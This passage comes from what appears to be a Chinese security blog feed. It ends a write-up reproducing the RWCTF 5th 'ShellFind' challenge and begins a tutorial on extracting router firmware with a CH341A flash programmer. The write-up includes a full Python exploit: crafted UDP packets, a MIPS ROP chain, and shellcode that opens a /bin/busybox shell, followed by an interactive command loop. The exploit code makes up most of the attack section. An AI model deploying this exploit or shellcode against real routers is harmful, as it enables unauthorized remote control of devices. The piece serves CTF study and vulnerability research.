class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:004027C8 lw      $t9, 0($s0)</span><br><span class="line">.text:004027CC bne     $t9, $s1, loc_4027C0</span><br><span class="line">.text:004027D0 addiu   $s0, -4</span><br><span class="line">.text:004027D0</span><br><span class="line">.text:004027D4 lw      $ra, 0x1C+var_s8($sp)</span><br><span class="line">.text:004027D8 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004027DC lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004027E0 jr      $ra</span><br><span class="line">.text:004027E4 addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure><p>把栈上的地址放到t9中，会跳到loc_4027C0中执行<code>jalr $t9</code>，执行栈地址上的东西</p><p>shellcode可以采用udp_bind_shell</p><p>但是在调试的时候会发现跳不到shellcode上，所以在上面的一个地方加上一个跳转指令</p><p><img src="/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><p>至此，上面就是完整的漏洞利用</p><p>exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.108'</span></span><br><span class="line">port = <span class="number">62720</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">lg(<span class="string">'[+] open connection'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'FIVI'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\n'</span></span><br><span class="line">p1 += <span class="string">b'\x01\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\xff'</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">r.sendto(p1, (ip, port))</span><br><span class="line"></span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmac</span>(<span class="params">mac_addr</span>):</span><br><span class="line">    hex_str = binascii.hexlify(mac_addr).decode()</span><br><span class="line">    mac_addr = <span class="string">':'</span>.join([hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line">    li(<span class="string">'[+] mac = '</span> + <span class="built_in">str</span>(mac_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(recv_data) == <span class="number">0x21d</span>):</span><br><span class="line">    mac_addr = recv_data[<span class="number">0x11</span>:<span class="number">0x17</span>]</span><br><span class="line">    getmac(mac_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ll(<span class="string">"[-] recv error"</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'\x00'</span> * <span class="number">588</span></span><br><span class="line">p3 += p32(<span class="number">0x004020A4</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span></span><br><span class="line"><span class="string">.text:004020A8 8F 99 80 38                   la      $t9, close</span></span><br><span class="line"><span class="string">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span></span><br><span class="line"><span class="string">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span></span><br><span class="line"><span class="string">.text:004020B0</span></span><br><span class="line"><span class="string">.text:004020B4</span></span><br><span class="line"><span class="string">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+238↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+284↑j</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x18</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00401F98</span>)   <span class="comment"># ra</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00401F98 0C 10 04 F4                   jal     my_puts</span></span><br><span class="line"><span class="string">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"</span></span><br><span class="line"><span class="string">.text:00401F9C</span></span><br><span class="line"><span class="string">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span></span><br><span class="line"><span class="string">.text:00401FA4 00 00 00 00                   nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">my_puts</span></span><br><span class="line"><span class="string">.text:004013D0 addiu   $sp, -0x10</span></span><br><span class="line"><span class="string">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span></span><br><span class="line"><span class="string">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span></span><br><span class="line"><span class="string">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span></span><br><span class="line"><span class="string">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span></span><br><span class="line"><span class="string">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span></span><br><span class="line"><span class="string">.text:004013E8 addiu   $sp, 0x10</span></span><br><span class="line"><span class="string">.text:004013EC jr      $ra</span></span><br><span class="line"><span class="string">.text:004013F0 nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">loc_4020B4</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += <span class="string">b'\x10\x00\x00\x30'</span> <span class="comment"># b 0xC4</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span> - <span class="number">0xd</span>) <span class="comment"># s0</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">4</span> <span class="comment"># s1</span></span><br><span class="line">p3 += p32(<span class="number">0x00400C9C</span>)     <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">p3 += p32(<span class="number">0x00400F28</span>) <span class="comment"># ra</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span></span><br><span class="line"><span class="string">.text:00400F28</span></span><br><span class="line"><span class="string">.text:00400F2C</span></span><br><span class="line"><span class="string">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span></span><br><span class="line"><span class="string">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span></span><br><span class="line"><span class="string">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span></span><br><span class="line"><span class="string">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span></span><br><span class="line"><span class="string">.text:00400F3C</span></span><br><span class="line"><span class="string">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:00400F48 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span>)     <span class="comment"># s0</span></span><br><span class="line">p3 += p32(<span class="number">0x004027C8</span>)     <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x1C\x00\x42"</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\x9C\xB0\x30"</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x82\x80\xB8"</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8C\x44\x00\x00"</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x85\x80\xF4"</span>        <span class="comment"># lw $a1, -0x7f0c($gp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x0c\xff\xef"</span>        <span class="comment"># li      t4,-17 ( addrlen = 16 )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x80\x30\x27"</span>        <span class="comment"># nor     a2,t4,zero</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x10\x4a"</span>        <span class="comment"># li      v0,4170 ( sys_connect )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0c"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x1C\x00\x42"</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\x9C\xB0\x30"</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x82\x80\xB8"</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8C\x44\x00\x00"</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b"\x24\x0f\xff\xfd"</span>        <span class="comment"># li      t7,-3</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\xe0\x28\x27"</span>        <span class="comment"># nor     a1,t7,zero</span></span><br><span class="line"><span class="comment">#shellcode+= b"\x8f\xa4\xff\xff"        # lw      a0,-1(sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x0f\xdf"</span>        <span class="comment"># li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0c"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line">shellcode+= <span class="string">b"\x20\xa5\xff\xff"</span>        <span class="comment"># addi    a1,a1,-1</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x01\xff\xff"</span>        <span class="comment"># li      at,-1</span></span><br><span class="line">shellcode+= <span class="string">b"\x14\xa1\xff\xfb"</span>        <span class="comment"># bne     a1,at, dup2_loop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve /bin/busybox sh</span></span><br><span class="line">shellcode+= <span class="string">b"\x28\x06\xFF\xFF"</span>        <span class="comment"># slti    $a2, $zero, -1</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x2F\x62"</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x69\x6E"</span>        <span class="comment"># ori     $t7, $t7, 0x696e</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xDC"</span>        <span class="comment"># sw      $t7, -0x24($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x2F\x62"</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x75\x73"</span>        <span class="comment"># ori     $t7, $t7, 0x7573</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xE0"</span>        <span class="comment"># sw      $t7, -0x20($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x79\x62"</span>        <span class="comment"># lui     $t7, 0x7962</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x6F\x78"</span>        <span class="comment"># ori     $t7, $t7, 0x6f78</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xE4"</span>        <span class="comment"># sw      $t7, -0x1c($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xE8"</span>        <span class="comment"># sw      $zero, -0x18($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x73\x68"</span>        <span class="comment"># lui     $t7, 0x7368</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xEC"</span>        <span class="comment"># sw      $t7, -0x14($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xF0"</span>        <span class="comment"># sw      $zero, -0x10($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xAF\xFF\xDC"</span>        <span class="comment"># addiu   $t7, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xF4"</span>        <span class="comment"># sw      $t7, -0xc($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xAF\xFF\xEC"</span>        <span class="comment"># addiu   $t7, $sp, -0x14</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xF8"</span>        <span class="comment"># sw      $t7, -8($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xFC"</span>        <span class="comment"># sw      $zero, -4($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xA4\xFF\xDC"</span>        <span class="comment"># addiu   $a0, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xA5\xFF\xF8"</span>        <span class="comment"># addiu   $a1, $sp, -8</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x0F\xAB"</span>        <span class="comment"># addiu   $v0, $zero, 0xfab</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0C"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">p3 += shellcode</span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">command = <span class="built_in">input</span>(<span class="string">"shell # "</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"exit"</span> <span class="keyword">in</span> command:</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">command += <span class="string">"\n"</span></span><br><span class="line">r.sendto(command.encode(), (ip, port))</span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">4096</span>)</span><br><span class="line">li(recv_data.decode())</span><br></pre></td></tr></tbody></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综合性的利用，对自己的提升非常有帮助，漏洞利用不只这一种方法，还有其他的，比如控制一参命令，调用system</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247490825&amp;idx=1&amp;sn=9f8faeb2cd148f7b8645077385f6f861&amp;chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&amp;mpshare=1&amp;scene=23&amp;srcid=01117AjQKN18fHXiXpvgTlhC&amp;sharer_sharetime=1673411100292&amp;sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd">https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247490825&amp;idx=1&amp;sn=9f8faeb2cd148f7b8645077385f6f861&amp;chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&amp;mpshare=1&amp;scene=23&amp;srcid=01117AjQKN18fHXiXpvgTlhC&amp;sharer_sharetime=1673411100292&amp;sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd</a></p><p><a href="https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA">https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;RWCTF-5th-ShellFind复现笔记&quot;&gt;&lt;a href=&quot;#RWCTF-5th-ShellFind复现笔记&quot; class=&quot;headerlink&quot; title=&quot;RWCTF 5th ShellFind复现</summary>
      
    
    
    
    <category term="WP" scheme="https://www.z1r0.top/categories/WP/"/>
    
    
    <category term="RW" scheme="https://www.z1r0.top/tags/RW/"/>
    
  </entry>
  
  <entry>
    <title>CH341A编程器在线固件提取</title>
    <link href="https://www.z1r0.top/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/"/>
    <id>https://www.z1r0.top/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/</id>
    <published>2023-03-30T10:36:03.000Z</published>
    <updated>2023-08-17T06:28:44.367Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="CH341A编程器在线固件提取"><a href="#CH341A编程器在线固件提取" class="headerlink" title="CH341A编程器在线固件提取"></a>CH341A编程器在线固件提取</h1><blockquote><p>起因是因为对某个路由器进行漏洞挖掘的时候发现官网没有固件下载</p></blockquote><h2 id="需要的工具"><a href="#需要的工具" class="headerlink" title="需要的工具"></a>需要的工具</h2><ul><li>CH341A编程器</li><li>SOP8测试夹</li><li>转接板</li></ul><p>可以去taobao买，买的时候选择CH341A编程器+SOP8测试夹即可</p><p>需要注意的是笔者买的是8角的，还有16角的是SOP16（需要看一下路由器的flash是哪个，也有NOR flash等等，这里以SOP8来演示）</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/1.jpg" alt="1"></p><h2 id="组装工具"><a href="#组装工具" class="headerlink" title="组装工具"></a>组装工具</h2><p>首先组装一下SOP8测试夹+转接板</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/2.jpg" alt="2"></p><p>红色线对应1的位置</p><p>确保CH341A编程器的黄色条线帽在1-2位置连接好</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/3.jpg" alt="3"></p><p>然后是将转接板与CH341A编程器进行连接</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/4.jpg" alt="4"></p><p>到了这里组装完成</p><h2 id="CH341A驱动安装"><a href="#CH341A驱动安装" class="headerlink" title="CH341A驱动安装"></a>CH341A驱动安装</h2><p>笔者用的windows 10，然后用<code>Asprogrammer</code>的时候会报错，报错原因是没有装驱动</p><p>这个网站里有对应的驱动，下载即可<a href="https://www.wch.cn/downloads/CH341SER_EXE.html">https://www.wch.cn/downloads/CH341SER_EXE.html</a></p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/5.png" alt="5"></p><p>直接点击安装就行，安装完成之后右击计算机，点击管理，然后找到CH341A这个usb设备（记得插到电脑上），右击，点击属性，驱动程序，更新驱动程序，点击浏览我的电脑以查找驱动程序</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/6.png" alt="6"></p><p>然后点击让我从计算机上的可用驱动程序列表中选取，找到端口（COM和LPT）</p><p>然后找一下wch.cn，找到对应的CH341A</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/7.png" alt="7"></p><p>然后下一页，继续，好了之后就可以在管理的端口（COM和LPT）里看到对应的CH341A</p><p>但是还是没有用，接下来点击设置，windows更新，点击查看所有可选更新，找到驱动程序更新里的wch.cn</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/8.png" alt="8"></p><p>勾选，然后下载并安装</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/9.png" alt="9"></p><p>安装完成之后就可以在外部接口里看到对应的CH341A</p><p>至此驱动安装完成</p><h2 id="在线固件提取"><a href="#在线固件提取" class="headerlink" title="在线固件提取"></a>在线固件提取</h2><p>把SOP8的夹子夹到8角的flash上，路由器不用插电，看自己有没有夹对就是看夹完之后路由器前面的灯亮不亮</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/10.jpg" alt="10"></p><p>然后打开Asprogrammer软件，下载地址：<a href="https://github.com/YTEC-info/CH341A-Softwares">https://github.com/YTEC-info/CH341A-Softwares</a></p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/11.png" alt="11"></p><p>点击自动检测，成功后会弹出型号</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/12.png" alt="12"></p><p>选中符合条件之后点击read ic</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/13.png" alt="13"></p><p>下面的进度条代表正在读取固件</p><p>读取完成之后就可以保存这个固件了</p><p><img src="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/14.png" alt="14"></p><p>保存完成之后就可以愉快的固件漏洞挖掘了，至此利用CH341A进行在线固件提取就完成了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个过程也是笔者自己慢慢找资料弄出来的，中间经历过失败也买错了东西，但是当完成的那一刻感觉很值得！</p><h1 id="Reference"><a 